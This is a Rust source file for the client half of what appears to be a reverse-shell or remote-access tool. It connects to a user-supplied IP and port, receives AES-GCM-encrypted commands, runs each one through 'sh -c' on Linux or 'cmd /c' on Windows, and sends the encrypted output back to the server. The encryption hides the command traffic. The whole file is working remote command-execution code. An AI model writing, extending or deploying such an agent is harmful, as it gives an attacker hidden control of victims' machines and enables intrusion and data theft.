
// Imports for Server & client function
use std::net::TcpStream;
// user input
use std::io::{Read, Write};
// For OS commands
use std::process::{Command, Stdio};
//For encryption
use aes_gcm::{aead::{Aead, AeadCore, KeyInit, OsRng}, Aes256Gcm};
//using new Engine , decode/encode depriciated
use base64::{engine::general_purpose, Engine as _};
//for encryption
use lazy_static::lazy_static;
use std::sync::Mutex;
use std::string::String;
// for user input
use inquire::Text;


// Define a fixed 32-byte key (for testing only)
// fix and remove ? 
const FIXED_KEY: [u8; 32] = [0; 32];

lazy_static! {
    static ref AES_KEY: Mutex<[u8; 32]> = Mutex::new(FIXED_KEY);
}

pub fn client_main() {

    let ip = Text::new("IP:").prompt();
    let port = Text::new("Port:").prompt();
    let addr = format!("{}:{}", ip.unwrap(), port.unwrap());
    println!("{}", addr);
    client(addr);

}

fn client(a: String) {

    match TcpStream::connect(a) {

        Ok(mut stream) => {

            println!(".> Successful connection");
            
            loop {

                //Read 4 bytes of len we sent from handle_client to get the length of the incoming message
                let mut length_buf = [0u8;4];
                if let Err(e) = stream.read_exact(&mut length_buf) {
                    println!("!> Server closed the connection or error reading length: {}", e);
                    break;
                }
                
                let expected_len = u32::from_be_bytes(length_buf) as usize;
                if expected_len == 0 {
                    println!("!> Received 0-length message. Exiting.");
                    break;
                }
                
                //read exactly 'expected_len' to bytes of the base64 data
                let mut base64_buf = vec![0u8; expected_len];
                if let Err(e) = stream.read_exact(&mut base64_buf) {
                    println!("!> Error reading base64 data: {}", e);
                    break;
                }

                //convert bytes to string
                let encrypted_str = match String::from_utf8(base64_buf) {
                    Ok(s) => s,
                    Err(_) => {
                        println!("!> Recieved invalid UTF-8 from server.");
                        continue;
                    }
                };
                
                //attempt to decrypt the msg
                let command_decrypted = decrypt(&encrypted_str);
                //println!("DEBUGGING: Received command: {}", command_decrypted.trim());

                // determine arch here
                let arch = return_based_on_os();

                if arch == 1 {

                    match Command::new("sh").arg("-c").arg(&command_decrypted).stdout(Stdio::piped()).stderr(Stdio::piped()).output() {
                        Ok(output) => {

                            let stdout = format!(
                                "{}{}",
                                String::from_utf8_lossy(&output.stdout), 
                                String::from_utf8_lossy(&output.stderr)
                            );

                            let output_msg = if output.status.success() {
                                stdout

                            } else {
                                format!("(!) Command Failed:\n {}", stdout)
                            };

                            //Encrypt the command before we send it back to the server
                            let encrypted_output = encrypt(&output_msg);

                            // Sent length first ( 4 byts, big-endian), to avoid the decrypting errors. sending impartial data.
                            let length_bytes = (encrypted_output.len() as u32).to_be_bytes();

                            if let Err(e) = stream.write_all(&length_bytes) {
                                println!("!> Failed to send length: {}", e);
                                break;
                            }

                            // Send the command OUTPUT to the SERVER
                            if let Err(e) = stream.write_all(encrypted_output.as_bytes()) {
                                println!("!> Failed to send command: {}", e);
                                break; // exit loop if the connection is broken
                            }

                        }
                        Err(e) => {
                            let error_msg = format!("\n!> {}\n", e);
                            stream.write_all(error_msg.as_bytes()).unwrap();
                        }      

                    }
                    
                } else {
                    
                    match Command::new("cmd").arg("/S").arg("/c").arg(&command_decrypted).stdout(Stdio::piped()).stderr(Stdio::piped()).output() {
                        Ok(output) => {

                            let stdout = format!(
                                "{}{}",
                                String::from_utf8_lossy(&output.stdout), 
                                String::from_utf8_lossy(&output.stderr)
                            );

                            let output_msg = if output.status.success() {
                                stdout

                            } else {
                                format!("(!) Command Failed:\n {}", stdout)
                            };

                            //Encrypt the command before we send it back to the server
                            let encrypted_output = encrypt(&output_msg);

                            // Sent length first ( 4 byts, big-endian), to avoid the decrypting errors. sending impartial data.
                            let length_bytes = (encrypted_output.len() as u32).to_be_bytes();

                            if let Err(e) = stream.write_all(&length_bytes) {
                                println!("!> Failed to send length: {}", e);
                                break;
                            }

                            // Send the command OUTPUT to the SERVER
                            if let Err(e) = stream.write_all(encrypted_output.as_bytes()) {
                                println!("!> Failed to send command: {}", e);
                                break; // exit loop if the connection is broken
                            }

                        }
                        Err(e) => {
                            let error_msg = format!("\n!> {}\n", e);
                            stream.write_all(error_msg.as_bytes()).unwrap();
                        }      

                    }
                };

            }

        }
        Err(e) => {
            println!("!> Failed to connect: {}", e);
        }

    }
    println!("!> Terminated");

}

fn return_based_on_os() -> i32 {
    #[cfg(target_os = "linux")]
    return 1;
    #[cfg(target_os = "windows")]
    return 2;
    //#[cfg(target_os = "macos")]
    //return 2;
}

fn encrypt(command: &str) -> String {

    let cmd_plain = command.as_bytes();

    let key = AES_KEY.lock().unwrap();
    let cipher = Aes256Gcm::new((&*key).into());

    let nonce_bytes: [u8; 12] = Aes256Gcm::generate_nonce(&mut OsRng).into();

    let ciphertext = cipher.encrypt(&nonce_bytes.into(), cmd_plain.as_ref()).expect("Cant encrypt the msg!");

    let mut combined = Vec::new();
    combined.extend_from_slice(&nonce_bytes);
    combined.extend_from_slice(&ciphertext);

    let fake2 = general_purpose::STANDARD.encode(combined);
    
    return fake2.to_string();

}

fn decrypt(ciphertext_b64: &str) -> String {

    let key = AES_KEY.lock().unwrap();
    let cipher = Aes256Gcm::new((&*key).into());

    let combined = general_purpose::STANDARD.decode(ciphertext_b64).expect("Failed to decode base64!");

    // the first 12 bytes are the nonce
    let (nonce_bytes, ciphertext) = combined.split_at(12);

    let plaintext = cipher.decrypt(nonce_bytes.into(), ciphertext).expect("Decryption Failed!");

    let fake = String::from_utf8(plaintext).expect("Invalid UTF-8");

    return fake.to_string();

}